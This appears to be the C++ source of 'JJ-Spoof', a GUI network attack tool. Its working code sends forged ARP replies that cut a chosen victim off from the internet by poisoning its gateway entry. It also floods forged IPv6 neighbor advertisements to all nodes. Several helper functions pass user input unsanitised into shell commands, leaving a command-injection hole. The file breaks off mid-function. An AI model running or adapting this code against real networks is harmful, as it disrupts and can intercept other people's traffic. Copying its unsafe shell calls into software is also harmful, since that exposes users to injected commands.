/* -------------------------------------------------------------------------- */
/*                                  JJ-Spoof                                  */
/* -------------------------------------------------------------------------- */
// TODO: NDF Spoof is affecting all instead of one device on the network


#ifndef _GNU_SOURCE
#define _GNU_SOURCE // Required for some definitions in netinet/icmp6.h on certain Linux systems
#endif

#include <iostream>          // For std::cout, std::cerr, std::endl
#include <string>            // For std::string
#include <vector>            // For dynamic arrays (packet buffer)
#include <cstring>           // For memset, memcpy
#include <fstream>           // For file streams (ifstream)
#include <sstream>           // For string streams (stringstream)
#include <unistd.h>          // For close, close()
#include <iomanip>           // For std::setw, std::setfill
#include <thread>            // For std::this_thread::sleep_for
#include <chrono>            // For std::chrono

// Networking / socket libraries
#include <sys/ioctl.h>       // For ioctl
#include <sys/socket.h>      // For socket, sendto, Core socket functions and types
#include <netinet/in.h>      // For sockaddr_in6, in6_addr, Internet address family (sockaddr_in, in_addr)
#include <arpa/inet.h>       // For inet_pton, inet_ntop, htons, htonl (host to network byte order conversion)
#include <net/if.h>          // For if_nametoindex, Network interface definitions (ifreq, if_nametoindex)
#include <netinet/icmp6.h>   // For icmp6_hdr, nd_neighbor_advert, ND_NEIGHBOR_ADVERT, ND_NA_FLAG_OVERRIDE, ND_NA_FLAG_SOLICITED, ND_OPT_TARGET_LINKADDR, nd_opt_hdr
#include <netinet/ip6.h>     // For ip6_hdr (though kernel handles this with IPPROTO_ICMPV6 raw socket)
#include <net/ethernet.h>    // Ethernet header definitions (ether_header, ETHERTYPE_ARP)
#include <linux/if_packet.h> // Linux specific: AF_PACKET and sockaddr_ll
#include <net/if_arp.h>      // For ARP opcodes (ARPOP_REQUEST, ARPOP_REPLY)

// FLTK GUI Headers
#include <FL/Fl.H>
#include <FL/Fl_Window.H>
#include <FL/Fl_Input.H>
#include <FL/Fl_Button.H>
#include <FL/Fl_Choice.H>
#include <FL/Fl_Output.H>
#include <FL/fl_ask.H>
#include <atomic>








/* --------------------- Common Network Utilities Class --------------------- */
class NetUtils
{
    public:
        class Headers
        {
            public:
                // ARP Header Structure
                struct arp_header {
                    unsigned short htype;
                    unsigned short ptype;
                    unsigned char hlen;
                    unsigned char plen;
                    unsigned short opcode;
                    unsigned char sender_mac[6];
                    unsigned int source_ip;
                    unsigned char target_mac[6];
                    unsigned int target_ip;
                };
                // NDP Header Structure
                struct ndp_header {
                    unsigned short htype;
                    unsigned short ptype;
                    unsigned char hlen;
                    unsigned char plen;
                    unsigned short opcode;
                    unsigned char sender_mac[6];
                    unsigned int source_ip;
                    unsigned char target_mac[6];
                    unsigned int target_ip;
                };
        };


        // Function to get type of ip address (IPv4||IPv6)
        int getIPAddressType(const std::string& ipString) {
            // Try to parse as IPv4
            struct in_addr ipv4Addr;
            if (inet_pton(AF_INET, ipString.c_str(), &ipv4Addr) == 1) {
                return 4; // It's an IPv4 address
            }

            // Try to parse as IPv6
            struct in6_addr ipv6Addr;
            if (inet_pton(AF_INET6, ipString.c_str(), &ipv6Addr) == 1) {
                return 6; // It's an IPv6 address
            }

            // If neither, it's invalid
            return 0; // Invalid
        }


        // Function to ping an IPv4 address
        static bool pingIPv4 (const std::string& ip_address)
        {
            std::cout << "Attempting to ping IPv4 address: " << ip_address << std::endl;
            std::string command = "ping -c 1 -W 2 " + ip_address + " > /dev/null 2>&1";

            int result = std::system(command.c_str());

            if (result == 0)
            {
                std::cout << "Ping successful to IPv4 address: " << ip_address << std::endl;
                return true;
            }
            else
            {
                std::cerr << "Ping failed to IPv4 address: " << ip_address << std::endl;
                return false;
            };
        };


        // Function to get MAC address from ARP cache
        std::string getMacFromArpCache (const std::string& ip_address)
        {
            // Ping the IP address to ensure it's in the ARP cache
            pingIPv4(ip_address);

            std::string mac_address;
            std::ifstream arp_file("/proc/net/arp"); // Linux specific ARP file

            if (!arp_file.is_open())
            {
                std::cerr << "Error opening /proc/net/arp" << std::endl;
                return mac_address;
            }

            std::string line;
            std::getline(arp_file, line);

            while (std::getline(arp_file, line))
            {
                std::istringstream ss(line);
                std::string ip, discard, mac;
                ss >> ip >> discard >> discard >> mac;

                if (ip == ip_address)
                {
                    mac_address = mac;
                    break;
                }

                std::cout << mac;
            }
            arp_file.close();
            return mac_address;
        };


        // Function to convert MAC address array (6 bytes) to string format
        static std::string mac_to_string(const unsigned char* mac)
        {
            char mac_str[18];

            snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

            return std::string(mac_str);
        };


        // Function to convert MAC address string to 6-byte array
        static bool string_to_mac(const std::string& mac_str, unsigned char* mac_array)
        {
            int values[6];

            if (sscanf(mac_str.c_str(), "%x:%x:%x:%x:%x:%x",
                    &values[0], &values[1], &values[2],
                    &values[3], &values[4], &values[5]) != 6) {
                return false;
            }

            for (int i = 0; i < 6; ++i) {
                mac_array[i] = static_cast<unsigned char>(values[i]);
            }

            return true;
        }


        // Function to generate EUI-64 IPv6 link-local address from MAC address
        std::string generate_eui64_ipv6(const std::vector<unsigned char>& mac_bytes)
        {
            if (mac_bytes.size() != 6) {
                throw std::invalid_argument("MAC address must be 6 bytes long.");
            }

            std::stringstream ipv6_ss;
            ipv6_ss << std::hex << std::setfill('0');

            // Prepend link-local prefix
            ipv6_ss << "fe80::";

            // First two bytes of MAC, with U/L bit inverted
            unsigned char first_byte_modified = mac_bytes[0] ^ 0x02; // Invert 7th bit
            ipv6_ss << std::setw(2) << static_cast<int>(first_byte_modified)
                    << std::setw(2) << static_cast<int>(mac_bytes[1]) << ":";

            // Next two bytes of MAC + FF:FE
            ipv6_ss << std::setw(2) << static_cast<int>(mac_bytes[2])
                    << "ff:fe"
                    << std::setw(2) << static_cast<int>(mac_bytes[3]) << ":";

            // Last two bytes of MAC
            ipv6_ss << std::setw(2) << static_cast<int>(mac_bytes[4])
                    << std::setw(2) << static_cast<int>(mac_bytes[5]);

            return ipv6_ss.str();
        }


        // Function to get local interface's IP address (IPv4)
        static bool get_local_ip(const std::string& ifname, std::string& ip_str) {
            int fd = socket(AF_INET, SOCK_DGRAM, 0);
            if (fd < 0) {
                perror("socket");
                return false;
            }
            struct ifreq ifr;
            strncpy(ifr.ifr_name, ifname.c_str(), IFNAMSIZ - 1);
            ifr.ifr_name[IFNAMSIZ - 1] = '\0';

            if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
                perror("ioctl SIOCIFADDR");
                close(fd);
                return false;
            }
            close(fd);
            ip_str = inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr);
            return true;
        }


        // Function to get local interface's MAC address
        static bool get_local_mac(const std::string& ifname, unsigned char* mac_addr) {
            int fd = socket(AF_INET, SOCK_DGRAM, 0);
            if (fd < 0) {
                perror("socket");
                return false;
            }
            struct ifreq ifr;
            strncpy(ifr.ifr_name, ifname.c_str(), IFNAMSIZ - 1);
            ifr.ifr_name[IFNAMSIZ - 1] = '\0';

            if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
                perror("ioctl SIOCGIFHWADDR");
                close(fd);
                return false;
            }
            close(fd);
            memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, 6);
            return true;
        }


        // Function to get interface index
        static int get_if_index(const std::string& ifname) {
            int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
            if (fd < 0) {
                perror("Socket AF_PACKET");
                return -1;
            }
            struct ifreq ifr;
            strncpy(ifr.ifr_name, ifname.c_str(), IFNAMSIZ - 1);
            ifr.ifr_name[IFNAMSIZ - 1] = '\0';

            if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) {
                perror("ioctl SIOCGIFINDEX");
                close(fd);
                return -1;
            }
            close(fd);
            return ifr.ifr_ifindex;
        }


        // Function to get MAC address for a given IPv6 address using neighbor cache
        std::string get_mac_from_ipv6(const std::string& ipv6_addr) {
            std::string cmd = "ip -6 neigh show " + ipv6_addr + " | awk '{print $5}'";
            FILE* fp = popen(cmd.c_str(), "r");
            if (!fp) return "";
            char buf[64] = {0};
            if (fgets(buf, sizeof(buf), fp) == nullptr) {
                pclose(fp);
                return "";
            }
            pclose(fp);
            std::string mac(buf);
            mac.erase(mac.find_last_not_of(" \n\r\t")+1);
            return mac;
        }


        // Function to get MAC address of the local interface for a given IPv6 address
        std::string get_self_mac_from_ipv6(const std::string& ipv6_addr) {
            std::string cmd = "ip -6 addr show | grep '" + ipv6_addr + "' -B2 | grep '^[0-9]' | awk '{print $2}' | sed 's/://'";
            FILE* fp = popen(cmd.c_str(), "r");
            if (!fp) return "";
            char ifname[64] = {0};
            if (fgets(ifname, sizeof(ifname), fp) == nullptr) {
                pclose(fp);
                return "";
            }
            pclose(fp);
            std::string iface(ifname);
            iface.erase(iface.find_last_not_of(" \n\r\t")+1);

            cmd = "cat /sys/class/net/" + iface + "/address";
            fp = popen(cmd.c_str(), "r");
            if (!fp) return "";
            char mac[64] = {0};
            if (fgets(mac, sizeof(mac), fp) == nullptr) {
                pclose(fp);
                return "";
            }
            pclose(fp);
            std::string mac_str(mac);
            mac_str.erase(mac_str.find_last_not_of(" \n\r\t")+1);
            return mac_str;
        }


        // Function to get the MAC from IP by sending an ARP request
        std::string get_mac_from_ip(const std::string& target_ip_str, const std::string& interface_name) {
            // --- Get local MAC and IP address for the specified interface ---
            unsigned char local_mac[6];
            std::string local_ip_str;

            if (!NetUtils::get_local_mac(interface_name, local_mac)) {
                std::cerr << "Error: Could not get local MAC address for interface " << interface_name << std::endl;
                return "";
            }
            if (!NetUtils::get_local_ip(interface_name, local_ip_str)) {
                std::cerr << "Error: Could not get local IP address for interface " << interface_name << std::endl;
                return "";
            }

            // --- Get interface index (needed for raw socket) ---
            int if_index = NetUtils::get_if_index(interface_name);
            if (if_index == -1) {
                std::cerr << "Error: Could not get interface index for " << interface_name << std::endl;
                return "";
            }

            // --- Create a raw socket for sending/receiving ARP packets ---
            int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
            if (sockfd < 0) {
                perror("socket(AF_PACKET, SOCK_RAW, ETH_P_ARP)");
                return "";
            }

            // --- Set a receive timeout for the socket (1 second) ---
            struct timeval tv;
            tv.tv_sec = 1;
            tv.tv_usec = 0;
            if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv)) < 0) {
                perror("setsockopt SO_RCVTIMEO");
                close(sockfd);
                return "";
            }

            // --- Convert target and local IP addresses from string to binary form ---
            struct in_addr target_in_addr, local_in_addr;
            if (inet_pton(AF_INET, target_ip_str.c_str(), &target_in_addr) != 1) {
                std::cerr << "Error: Invalid target IP address" << std::endl;
                close(sockfd);
                return "";
            }
            if (inet_pton(AF_INET, local_ip_str.c_str(), &local_in_addr) != 1) {
                std::cerr << "Error: Invalid local IP address" << std::endl;
                close(sockfd);
                return "";
            }

            // --- Build Ethernet + ARP request frame ---
            std::vector<unsigned char> ether_frame(ETH_HLEN + sizeof(NetUtils::Headers::arp_header));
            struct ether_header* eh = (struct ether_header*)ether_frame.data();
            struct NetUtils::Headers::arp_header* ah = (struct NetUtils::Headers::arp_header*)(ether_frame.data() + ETH_HLEN);

            // Ethernet header: broadcast destination, our MAC as source, ARP EtherType
            memset(eh->ether_dhost, 0xFF, ETH_ALEN);           // Broadcast
            memcpy(eh->ether_shost, local_mac, ETH_ALEN);      // Source MAC
            eh->ether_type = htons(ETHERTYPE_ARP);             // EtherType: ARP

            // ARP header: Ethernet/IP, request, fill in sender/target fields
            ah->htype = htons(ARPHRD_ETHER);                   // Hardware type: Ethernet
            ah->ptype = htons(ETH_P_IP);                       // Protocol type: IPv4
            ah->hlen = ETH_ALEN;                               // Hardware address length: 6
            ah->plen = 4;                                      // Protocol address length: 4
            ah->opcode = htons(ARPOP_REQUEST);                 // Opcode: ARP request

            memcpy(ah->sender_mac, local_mac, ETH_ALEN);       // Sender MAC: our MAC
            ah->source_ip = local_in_addr.s_addr;              // Sender IP: our IP
            memset(ah->target_mac, 0x00, ETH_ALEN);            // Target MAC: unknown
            ah->target_ip = target_in_addr.s_addr;             // Target IP: the one we're querying

            // --- Prepare sockaddr_ll for sending the frame ---
            struct sockaddr_ll sa_ll;
            memset(&sa_ll, 0, sizeof(sa_ll));
            sa_ll.sll_family = AF_PACKET;
            sa_ll.sll_ifindex = if_index;
            sa_ll.sll_halen = ETH_ALEN;
            memcpy(sa_ll.sll_addr, eh->ether_dhost, ETH_ALEN); // Destination MAC (broadcast)

            // --- Send the ARP request ---
            if (sendto(sockfd, ether_frame.data(), ether_frame.size(), 0,
                    (struct sockaddr*)&sa_ll, sizeof(sa_ll)) < 0) {
                perror("sendto");
                close(sockfd);
                return "";
            }
            std::cout << "ARP request sent for IP: " << target_ip_str << std::endl;

            // --- Listen for ARP replies ---
            std::vector<unsigned char> recv_buffer(1500);
            ssize_t bytes_received;

            while (true) {
                bytes_received = recvfrom(sockfd, recv_buffer.data(), recv_buffer.size(), 0, NULL, NULL);
                if (bytes_received < 0) {
                    // Timeout or error
                    if (errno == EWOULDBLOCK || errno == EAGAIN) {
                        std::cerr << "Timeout: No ARP reply received." << std::endl;
                        close(sockfd);
                        return "";
                    }
                    perror("recvfrom");
                    close(sockfd);
                    return "";
                }

                // Check if received frame is large enough for Ethernet + ARP
                if (bytes_received < (ssize_t)(ETH_HLEN + sizeof(NetUtils::Headers::arp_header))) {
                    continue;
                }

                eh = (struct ether_header*)recv_buffer.data();
                if (ntohs(eh->ether_type) != ETHERTYPE_ARP) {
                    continue; // Not an ARP packet
                }

                ah = (struct NetUtils::Headers::arp_header*)(recv_buffer.data() + ETH_HLEN);

                // Check for ARP reply from the target IP
                if (ntohs(ah->opcode) == ARPOP_REPLY && ah->source_ip == target_in_addr.s_addr) {
                    close(sockfd);
                    return NetUtils::mac_to_string(ah->sender_mac);
                };
            };
        };
};




/* --------------------------- ARP Spoofing Class --------------------------- */
class ARPSpoof
{
    private:
        NetUtils net_utils;
    public:
        const char* if_name = "wlp4s0";
        const char* source_ip;
        const char* target_ip;

        bool send_arp_spoof_reply(
            const std::string& interface_name,
            const std::string& target_ip_str,
            const std::string& target_mac_str,
            const std::string& spoofed_ip_str,
            const std::string& spoofed_mac_str)
        {
            // Vars
            unsigned char my_actual_mac[6];
            unsigned char target_mac_array[6];
            unsigned char spoofed_mac_array[6];


            // Get local MAC address
            if (!NetUtils::get_local_mac(interface_name, my_actual_mac))
            {
                std::cerr << "Error: Could not get local MAC address for interface " << interface_name << std::endl;
                return false;
            }

            // Get interface index
            int if_index = NetUtils::get_if_index(interface_name);
            if (if_index == -1)
            {
                std::cerr << "Error: Could not get interface index for " << interface_name << std::endl;
                return false;
            }

            // Create raw socket for ARP
            int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
            if (sockfd < 0)
            {
                perror("socket(AF_PACKET, SOCK_RAW, ETH_P_ARP)");
                return false;
            }

            // Check if target IPv4 is valid and convert it to binary form
            struct in_addr target_in_addr, spoofed_in_addr;
            if (inet_pton(AF_INET, target_ip_str.c_str(), &target_in_addr) != 1)
            {
                std::cerr << "Error: Invalid target IP address for spoofing." << std::endl;
                close(sockfd);
                return false;
            }

            // Check if spoofed IPv4 is valid and convert it to binary form
            if (inet_pton(AF_INET, spoofed_ip_str.c_str(), &spoofed_in_addr) != 1)
            {
                std::cerr << "Error: Invalid spoofed IP address." << std::endl;
                close(sockfd);
                return false;
            }

            // Convert inputted target mac into 6-byte array
            if (!NetUtils::string_to_mac(target_mac_str, target_mac_array))
            {
                std::cerr << "Error: Invalid target MAC address for spoofing." << std::endl;
                close(sockfd);
                return false;
            }

            // Convert inputted spoofed mac into 6-byte array
            if (!NetUtils::string_to_mac(spoofed_mac_str, spoofed_mac_array))
            {
                std::cerr << "Error: Invalid spoofed MAC address." << std::endl;
                close(sockfd);
                return false;
            }


            // Create a buffer for the Ethernet frame (Ethernet header + ARP header)
            std::vector<unsigned char> ether_frame(ETH_HLEN + sizeof(NetUtils::Headers::arp_header));

            // Pointer to the Ethernet header portion of the frame
            struct ether_header* eh = (struct ether_header*)ether_frame.data();

            // Pointer to the ARP header portion of the frame (immediately after Ethernet header)
            NetUtils::Headers::arp_header* ah = (NetUtils::Headers::arp_header*)(ether_frame.data() + ETH_HLEN);


            // Set Ethernet header fields:
            // Destination MAC: target's MAC, Source MAC: our actual MAC, EtherType: ARP
            memcpy(eh->ether_dhost, target_mac_array, ETH_ALEN); // Destination: victim's MAC
            memcpy(eh->ether_shost, my_actual_mac, ETH_ALEN);    // Source: our MAC (can be spoofed if needed)
            eh->ether_type = htons(ETHERTYPE_ARP);               // EtherType: ARP

            // Set ARP header fields for a reply:
            ah->htype = htons(ARPHRD_ETHER);                     // Hardware type: Ethernet
            ah->ptype = htons(ETH_P_IP);                         // Protocol type: IPv4
            ah->hlen = ETH_ALEN;                                 // Hardware address length: 6 (MAC)
            ah->plen = 4;                                        // Protocol address length: 4 (IPv4)
            ah->opcode = htons(ARPOP_REPLY);                     // Opcode: ARP reply

            // ARP payload:
            memcpy(ah->sender_mac, spoofed_mac_array, ETH_ALEN); // Sender MAC: spoofed MAC (the one we want the victim to associate with the spoofed IP)
            ah->source_ip = spoofed_in_addr.s_addr;              // Sender IP: spoofed IP (the one we want to claim)
            memcpy(ah->target_mac, target_mac_array, ETH_ALEN);  // Target MAC: victim's MAC
            ah->target_ip = target_in_addr.s_addr;               // Target IP: victim's IP

            // Prepare sockaddr_ll for sending the raw Ethernet frame
            struct sockaddr_ll sa_ll;
            memset(&sa_ll, 0, sizeof(sa_ll));
            sa_ll.sll_family = AF_PACKET;                        // Address family: packet
            sa_ll.sll_ifindex = if_index;                        // Interface index
            sa_ll.sll_halen = ETH_ALEN;                          // Hardware address length
            memcpy(sa_ll.sll_addr, eh->ether_dhost, ETH_ALEN);   // Destination MAC

            // Send the spoofed ARP reply frame
            if (sendto (sockfd, ether_frame.data(), ether_frame.size(), 0,
                    (struct sockaddr*)&sa_ll, sizeof(sa_ll)) < 0)
            {
                perror("sendto (spoofed ARP reply)");
                close(sockfd);
                return false;
            }

            // Log the spoofed ARP reply details
            std::cout << "Sent spoofed ARP reply: "
                    << spoofed_ip_str << " is at " << spoofed_mac_str
                    << " to " << target_ip_str << " (" << target_mac_str << ")" << std::endl;

            close(sockfd);
            return true;
        }


        // Function to run ARP Spoof
        int run (
            std::atomic<bool>& attack_running) {
            std::string interface = if_name;
            std::string victim_ip = target_ip;
            std::string gateway_ip = source_ip;
            
            // Get Local MAC address
            unsigned char my_mac_array[6];
            if (!NetUtils::get_local_mac(interface, my_mac_array)) {
            std::cerr << "Failed to get local MAC address." << std::endl;
            return 1;
            }
            std::string my_mac = NetUtils::mac_to_string(my_mac_array);
            std::cout << "My MAC address: " << my_mac << std::endl;

            // Get target MAC address
            std::string victim_mac = net_utils.getMacFromArpCache(victim_ip);
            if (victim_mac.empty()) {
            std::cerr << "Failed to get victim's MAC address from ARP cache. Exiting." << std::endl;
            return 1;
            }
            std::cout << "Victim (" << victim_ip << ") MAC address: " << victim_mac << std::endl;

            // Get source MAC address
            std::string gateway_mac = net_utils.getMacFromArpCache(gateway_ip);
            if (gateway_mac.empty()) {
            std::cerr << "Failed to get gateway's MAC address from ARP cache. Exiting." << std::endl;
            return 1;
            }
            std::cout << "Gateway (" << gateway_ip << ") MAC address: " << gateway_mac << std::endl;

            // Print ARP Starting message
            std::cout << "\nStarting ARP spoofing to block internet for " << victim_ip << std::endl;
            std::cout << "Press Ctrl+C to stop.\n" << std::endl;

            // Start ARP Attack (send packets)
            while (attack_running) {
            if (!send_arp_spoof_reply(interface, victim_ip, victim_mac, gateway_ip, my_mac)) {
                std::cerr << "Error sending spoofed reply to victim for gateway." << std::endl;
            }
            std::this_thread::sleep_for(std::chrono::seconds(2));
            }

            return 0;
        }
};




/* --------------------------- NDP Spoofing Class --------------------------- */
class NDPSpoof
{
    private:
        NetUtils net_utils;

    public:
        const char* if_name = "wlp4s0";
        const char* source_ip;
        const char* target_ip;


        // Function to run NDP (Neighbor Discovery Protocol) spoofing attack
        int run(std::atomic<bool>& attack_running)
        {
            // Get the source IPv6 address (the address to be spoofed)
            const char* source_ipv6_str = source_ip;

            // Get the MAC address of the local interface associated with the source IPv6 address
            std::string source_mac_str = net_utils.get_self_mac_from_ipv6(source_ipv6_str);

            // Get the target (victim) IPv6 address
            const char* target_ipv6_str = target_ip;

            // Get the MAC address associated with the target IPv6 address from the neighbor cache
            std::string spoofed_mac_str = net_utils.get_mac_from_ipv6(target_ipv6_str);

            // Set the destination IPv6 address to the all-nodes multicast address (ff02::1)
            const char* destination_ipv6_str = "ff02::1";

            int sock_fd; // Raw socket file descriptor
            struct sockaddr_in6 dest_addr; // Destination address structure
            struct in6_addr source_in6_addr, target_in6_addr, dest_in6_addr; // IPv6 address structs
            unsigned char source_mac[6];   // Source MAC address (local)
            unsigned char spoofed_mac[6];  // Spoofed MAC address (to advertise)

            // Allocate a buffer for the ICMPv6 Neighbor Advertisement packet
            const int PACKET_SIZE = 100;
            unsigned char packet_buffer[PACKET_SIZE];
            memset(packet_buffer, 0, PACKET_SIZE);

            // Convert source IPv6 string to binary form
            if (inet_pton(AF_INET6, source_ipv6_str, &source_in6_addr) != 1) {
            std::cerr << "Error: Invalid source IPv6 address." << std::endl;
            return 1;
            }
            // Convert target IPv6 string to binary form
            if (inet_pton(AF_INET6, target_ipv6_str, &target_in6_addr) != 1) {
            std::cerr << "Error: Invalid target IPv6 address." << std::endl;
            return 1;
            }
            // Convert destination IPv6 string to binary form
            if (inet_pton(AF_INET6, destination_ipv6_str, &dest_in6_addr) != 1) {
            std::cerr << "Error: Invalid destination IPv6 address." << std::endl;
            return 1;
            }
            // Convert MAC address strings to 6-byte arrays
            NetUtils::string_to_mac(source_mac_str, source_mac);
            NetUtils::string_to_mac(spoofed_mac_str, spoofed_mac);

            // Create a raw socket for sending ICMPv6 packets
            sock_fd = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);
            if (sock_fd < 0) {
            perror("socket creation failed");
            std::cerr << "Error: Could not create raw socket. Are you running as root (sudo)?" << std::endl;
            return 1;
            }

            // Get the interface index for the specified interface name
            unsigned int if_idx = if_nametoindex(if_name);
            if (if_idx == 0) {
            std::cerr << "Error: Interface '" << if_name << "' not found." << std::endl;
            close(sock_fd);
            return 1;
            }
            // Bind the socket to the specified interface (optional, but recommended)
            if (setsockopt(sock_fd, SOL_SOCKET, SO_BINDTODEVICE, if_name, strlen(if_name)) < 0) {
            perror("setsockopt SO_BINDTODEVICE failed");
            std::cerr << "Warning: Could not bind socket to interface " << if_name
                << ". Packet might be sent via default route." << std::endl;
            }

            // Construct the ICMPv6 Neighbor Advertisement header
            struct icmp6_hdr *icmp6 = (struct icmp6_hdr *)packet_buffer;
            icmp6->icmp6_type = ND_NEIGHBOR_ADVERT; // Type: Neighbor Advertisement (136)
            icmp6->icmp6_code = 0;                  // Code: 0
            icmp6->icmp6_cksum = 0;                 // Checksum (kernel will fill if zero)

            // Construct the Neighbor Advertisement payload
            struct nd_neighbor_advert *nd_na = (struct nd_neighbor_advert *)(packet_buffer + sizeof(struct icmp6_hdr));
            nd_na->nd_na_flags_reserved = ND_NA_FLAG_OVERRIDE | ND_NA_FLAG_SOLICITED; // Set flags: Override and Solicited
            memcpy(&nd_na->nd_na_target, &target_in6_addr, sizeof(struct in6_addr));  // Target address (the address being spoofed)

            // Construct the Target Link-Layer Address option
            struct nd_opt_hdr *nd_opt = (struct nd_opt_hdr *)(packet_buffer + sizeof(struct icmp6_hdr) + sizeof(struct nd_neighbor_advert));
            nd_opt->nd_opt_type = ND_OPT_TARGET_LINKADDR; // Option type: Target Link-Layer Address (2)
            nd_opt->nd_opt_len = 1;                       // Option length: 1 (means 8 bytes: header + MAC)
            memcpy(nd_opt + 1, spoofed_mac, 6);           // Copy the spoofed MAC address after the option header

            // Calculate the total packet length
            int packet_len = sizeof(struct icmp6_hdr) + sizeof(struct nd_neighbor_advert) + sizeof(struct nd_opt_hdr) + 6;

            // Prepare the destination sockaddr_in6 structure
            memset(&dest_addr, 0, sizeof(dest_addr));
            dest_addr.sin6_family = AF_INET6;
            memcpy(&dest_addr.sin6_addr, &dest_in6_addr, sizeof(struct in6_addr));

            // Print information about the spoofing attack
            std::cout << "Sending spoofed Neighbor Advertisement for " << target_ipv6_str
                << " with MAC " << spoofed_mac_str << " from interface " << if_name << std::endl;

            // Main attack loop: send spoofed Neighbor Advertisement packets repeatedly
            while (attack_running) {

                // Delay to prevent server overload
                //std::this_thread::sleep_for(std::chrono::milliseconds(200));

                ssize_t bytes_sent = sendto(sock_fd, packet_buffer, packet_len, 0,
                                (struct sockaddr *)&dest_addr, sizeof(dest_addr));
                if (bytes_sent < 0) {
                    perror("sendto failed");
                    std::cerr << "Error: Failed to send packet. Check permissions and network setup." << std::endl;
                } else {
                    std::cout << "Successfully sent " << bytes_sent << " bytes." << std::endl;
                }
            }

            // Close the raw socket
            close(sock_fd);
            return 0;
        }
};




/* ----------------------------- FLTK GUI Class ----------------------------- */
class SpooferGUI : public Fl_Window
{
    public:
        SpooferGUI(int W, int H, const char* title) : Fl_Window(W, H, title)
        {
            // Initialize GUI components here
            inp_interface = new Fl_Input(120, 20, 260, 25, "Interface:");
            inp_interface->value("wlp4s0"); // Default value

            // Input for Gateway (Source) IP
            inp_gateway_ip = new Fl_Input(120, 55, 260, 25, "Source IP:");
            inp_gateway_ip->callback(ip_field_changed_cb, this);

            // Input for Target (Victim) IP
            inp_target_ip = new Fl_Input(120, 90, 260, 25, "Target IP:");
            inp_target_ip->callback(ip_field_changed_cb, this);

            // Dropdown for Attack Type
            choice_attack_type = new Fl_Choice(120, 125, 150, 25, "Attack Type:");
            choice_attack_type->add("ARP (IPv4)");
            choice_attack_type->add("NDP (IPv6)");
            choice_attack_type->value(0); // Default to ARP

            // Start Attack Button
            btn_start = new Fl_Button(20, 170, 170, 30, "Start Attack");
            btn_start->callback(start_attack_cb, this);

            // Stop Attack Button
            btn_stop = new Fl_Button(210, 170, 170, 30, "Stop Attack");
            btn_stop->callback(stop_attack_cb, this);
            btn_stop->deactivate(); // Initially disabled

            // Status Output
            out_status = new Fl_Output(55, 220, 305, 25, "Status:");
            out_status->value("Idle.");

            // Make input text scale with window size
            // We'll override resize() and set font size based on window height
            this->end();
            this->resizable(this);
        }

        ~SpooferGUI() override {
            stop_attack(); // Ensure thread is stopped on exit
        }

    private:
        Fl_Input* inp_interface;
        Fl_Input* inp_gateway_ip;
        Fl_Input* inp_target_ip;
        Fl_Choice* choice_attack_type;
        Fl_Button* btn_start;
        Fl_Button* btn_stop;
        Fl_Output* out_status;


        // --- Threading & State ---
        std::atomic<bool> attack_running;
        std::unique_ptr<std::thread> attack_thread;


        // Override for window resize (scale everything properly)
        void resize(int X, int Y, int W, int H) override {
            Fl_Window::resize(X, Y, W, H);

            // Calculate font size based on window height (adjust scaling as needed)
            int font_size = std::max(12, H / 16);

            inp_interface->textsize(font_size);
            inp_gateway_ip->textsize(font_size);
            inp_target_ip->textsize(font_size);
            choice_attack_type->textsize(font_size);
            btn_start->labelsize(font_size);
            btn_stop->labelsize(font_size);
            out_status->textsize(font_size);

            // Optionally, also scale label sizes
            inp_interface->labelsize(font_size);
            inp_gateway_ip->labelsize(font_size);
            inp_target_ip->labelsize(font_size);
            choice_attack_type->labelsize(font_size);
            out_status->labelsize(font_size);
        }


        // Function to update IP fields for NDP spoofing: convert IPv4 to IPv6 (EUI-64) if needed
        void NDP_IP_Update() {
            // Only run this logic if "NDP (IPv6)" is selected
            if (choice_attack_type->value() == 0) {
            return; // ARP selected, nothing to do
            }

            // Get current values from GUI fields
            std::string source = inp_gateway_ip->value();
            std::string target = inp_target_ip->value();

            NetUtils net_utils;
            int ip_type_source = net_utils.getIPAddressType(source);
            int ip_type_target = net_utils.getIPAddressType(target);

            // --- Convert source IP to IPv6 if it's IPv4 ---
            if (ip_type_source == 4)
            {
                // Get local MAC address for the selected interface
                unsigned char mac_bytes[6];
                if (!NetUtils::get_local_mac(inp_interface->value(), mac_bytes))
                {
                    fl_alert("Failed to get local MAC address for interface.");
                    return;
                }
                // Generate EUI-64 IPv6 link-local address from MAC
                std::vector<unsigned char> mac_vec(mac_bytes, mac_bytes + 6);
                std::string ipv6_source = net_utils.generate_eui64_ipv6(mac_vec);
                inp_gateway_ip->value(ipv6_source.c_str()); // Update GUI field
                source = ipv6_source; // Update local variable
                ip_type_source = 6;   // Mark as IPv6 now
            }

            // --- Convert target IP to IPv6 if it's IPv4 ---
            if (ip_type_target == 4)
            {
                // Try to get target MAC from ARP cache
                std::string target_mac = net_utils.getMacFromArpCache(target);

                // If target MAC isn't found in the ARP cache, send an ARP request directly
                if (target_mac.empty())
                {
                    std::cout << "Sending an ARP request to get target MAC address..." << std::endl;
                    target_mac = net_utils.get_mac_from_ip(target, inp_interface->value());
                };
                // If target MAC can't be found again, return an error.
                if (target_mac.empty())
                {
                    fl_alert("Failed to get target MAC address for IPv4: %s", target.c_str());
                    return;
                };

                // Convert MAC string to byte array
                unsigned char mac_bytes[6];
                if (!NetUtils::string_to_mac(target_mac, mac_bytes)) {
                    fl_alert("Failed to parse target MAC address.");
                    return;
                }
                // Generate EUI-64 IPv6 link-local address from MAC
                std::vector<unsigned char> mac_vec(mac_bytes, mac_bytes + 6);
                std::string ipv6_target = net_utils.generate_eui64_ipv6(mac_vec);
                inp_target_ip->value(ipv6_target.c_str()); // Update GUI field
                target = ipv6_target; // Update local variable
                ip_type_target = 6;   // Mark as IPv6 now
            }
        }


        void start_attack() {
            if (attack_running) {
                fl_alert("Attack is already running!");
                return;
            }

            // Get values from GUI
            std::string interface = inp_interface->value();
            std::string source = inp_gateway_ip->value();
